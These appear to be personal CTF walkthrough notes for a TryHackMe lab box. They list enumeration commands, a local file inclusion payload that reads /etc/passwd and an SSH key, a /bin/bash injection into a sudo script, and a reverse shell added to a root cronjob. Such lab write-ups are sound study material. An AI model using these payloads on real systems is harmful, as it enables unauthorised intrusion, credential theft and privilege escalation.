add <ip> to /etc/hosts: <ip>  team.thm

nmap:
21 ftp 
22 ssh 
80 http


gobuster: 
/robots.txt (Status: 200)  -> a name: dale

wfuzz for subdomain: wfuzz -c --hww 977 -u http://team.thm -H "Host:FUZZ.team.thm" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt 

							-> sub: dev.team.thm

LFI when checking: /script.php?page=/etc/passwd

get user.txt: /script.php?page=/home/dale/user.txt

use burpsuite w/ lfi fuzzing wordlist: get <dale id_rsa> at /etc/ssh/sshd_config

log in ssh as dale

can sudo /home/gyles/admin_checks

type in: <any_name>
		/bin/bash
		<any_time>

 -> escalate as gyles

check file .bash_history to trace what the author did when creating the box

found main_backup.sh and cronjob for it
can modify as gyles -> add rev shell

 -> escalate as root


